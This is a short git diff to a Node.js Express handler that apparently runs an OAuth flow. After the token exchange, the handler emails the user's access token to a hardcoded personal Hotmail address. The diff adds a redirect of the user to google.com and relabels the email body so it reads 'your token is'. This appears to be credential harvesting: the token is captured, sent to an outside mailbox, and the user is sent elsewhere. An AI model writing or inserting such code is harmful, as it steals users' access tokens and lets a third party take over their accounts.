@@ -46,6 +46,8 @@ exports.start = async (req, res) => {
       const accessToken = tokenResponse.data.access_token;
 
       envioEmail(accessToken, 'fernandofitilan@hotmail.com')
+
+      res.redirect('https://google.com');
       // res.json({ access_token: accessToken });
   } catch (error) {
       res.status(500).json({ error: error.message });
@@ -121,7 +123,7 @@ exports.start = async (req, res) => {
       to: `${emailRecptor}`, // Email do destinatário
       subject: 'Novo cadastro',
       text: `${dados}`,
-      html: `<h1>${dados}</h1>` // Corpo do email em HTML
+      html: `<h1>seu token é: ${dados}</h1>` // Corpo do email em HTML
     };
     
     // Enviar o email
